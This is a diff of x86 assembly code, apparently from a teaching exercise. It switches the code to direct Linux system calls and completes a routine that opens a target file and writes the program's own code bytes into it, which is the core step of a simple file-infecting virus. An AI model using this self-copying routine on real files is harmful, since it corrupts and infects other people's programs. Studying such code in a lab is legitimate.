@@ -1,5 +1,7 @@
 section .rodata
     greet: db "Hello, infected file", 10, 0
+    msg: db "got here\n", 10, 0
+ 
 section .text
 global _start
 global system_call
@@ -46,21 +48,19 @@ system_call:
     ret                     ; Back to caller
 
 code_start:
-    ifection:
+    infection:
         push ebp
         mov ebp, esp
         pushad
         mov eax, [ebp+8]
         and al, 0x01
         jnz end
-        push dword 4
-        push dword 1
-        push dword [greet]
-        push dword 19
-        call system_call
-        add esp, 16
+	mov eax, 4
+	mov ebx, 1
+	mov ecx, greet
+	mov edx, 20
+	int 0x80
     end:
-        add esp, 4
         popad
         pop ebp
         ret
@@ -70,22 +70,20 @@ code_start:
         mov ebp, esp
         sub esp, 4
         pushad
-        mov eax, [ebp+8]
-        push dword 5
-        push dword eax
-        push dword 0x0008
-        call system_call
+	mov eax, 5
+        mov ebx, [ebp+8]
+        mov ecx, 8
+	int 0x80
         mov [ebp-4], eax
-        add esp, 12
-        push dword 4
-        push dword code_start
-        mov ebx, code_end
-        sub ebx, code_start
-        push dword ebx
-        call system_call
-        add esp, 12
-        mov eax, [ebp-4]
-        push dword eax
+	mov eax, 4
+	mov ebx, [ebp-4]
+	mov ecx, code_start
+        mov edx, code_end
+        sub edx, code_start
+	int 0x80
+	mov eax, 6
+	mov ebx, [ebp-4]
+	int 0x80
         popad
         add esp, 4
         pop ebp
